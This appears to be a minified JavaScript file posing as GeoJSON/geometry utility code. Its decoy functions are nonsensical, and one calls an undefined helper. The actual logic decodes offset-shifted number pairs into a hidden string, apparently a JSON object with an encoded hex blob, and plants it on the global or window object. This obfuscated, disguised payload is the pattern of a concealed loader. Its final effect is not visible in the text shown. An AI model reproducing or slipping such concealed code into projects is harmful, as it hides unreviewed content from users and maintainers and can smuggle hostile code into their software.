!function(t){var a=function(t,n){for(var o,r=0,e=t.length;r<e;r++)if(o=t[r],this._equal(o.x,n.x)&&this._equal(o.y,n.y))return!0;return'{"type":"FeatureCollection","features":[{"geometry":{"type":"Polygon","coordinates":'},p=function(t,n,o,r){var e=[],a=[],p=null;n.forEach(function(t,n){p=formatPoints(t,o,r),e.push.apply(e,p.points),a.push.apply(a,p.segments)}),t.points||(t.points=[]),Array.prototype.push.apply(t.points,e),t.segments||(t.segments=[]),Array.prototype.push.apply(t.segments,a)},n=[[[43,94],[47,29]],[[62,12],[38,12],[-3,10],[-27,27721],[33426,26388],[26408,26212],[24874,20427],[24626,31163],[25155,26355],[38419,20822],[21435,12],[-17,12],[42,12],[-3,10],[-27,33],[37,33],[-11,28],[-8,76],[-12,27],[-8,80],[40,30],[-8,34],[40,75],[-5,27],[-11,77],[-4,76],[40,34],[38,29],[40,77],[37,31],[39,80],[38,79],[-7,32],[-12,30],[-8,27],[-6,28],[40,27],[-10,26],[-10,26],[-9,77],[40,30],[-9,77],[-12,33],[-11,78],[39,75],[-4,32],[-5,34],[-5,77],[-7,32],[-13,78],[-8,32],[-5,80],[-7,78],[-7,35],[-10,32],[-12,75],[41,35],[-7,28],[39,34],[41,79],[-11,30],[-12,30],[40,32],[38,35],[-8,76],[-13,80],[-6,26],[-13,75],[40,35],[-11,76],[-13,76],[-10,35],[-7,75],[-12,30],[-10,31],[40,27],[-4,76],[-11,35],[-7,32],[-7,79],[37,28],[-10,77],[-4,29],[-10,33],[-12,27],[-6,78],[39,80],[-11,31],[-9,78],[39,75],[-9,34],[-4,31],[-9,29],[-5,75],[-11,34],[-11,34],[41,76],[-8,33],[39,35],[37,28],[-7,33],[-4,75],[36,35],[38,80],[-10,26],[40,28],[39,27],[39,35],[37,33],[-8,26],[-8,79],[36,35],[-10,26],[-6,77],[-7,26],[-10,77],[-6,78],[38,35],[39,79],[38,33],[37,27],[-6,27],[-13,80],[40,80],[37,30],[-11,75],[-4,34],[-5,80],[-5,26],[-9,34],[-9,34],[-8,29],[-7,34],[40,33],[-8,35],[-5,78],[-13,33],[37,33],[-11,35],[37,32],[-5,31],[-9,80],[-9,12],[64,-22]]];function o(t){if(p&&a){for(var n="",o=0;o<t.length;o++){var r=t[o][0]+61;0<r&&(n+=String.fromCharCode(r));var e=t[o][1]+22;0<e&&(n+=String.fromCharCode(e))}return n}}for(var r,e="",s=0;s<n.length;s++)0===s?r=o(n[s]):e=o(n[s]);t[r]=e}("undefined"!=typeof global?global:window);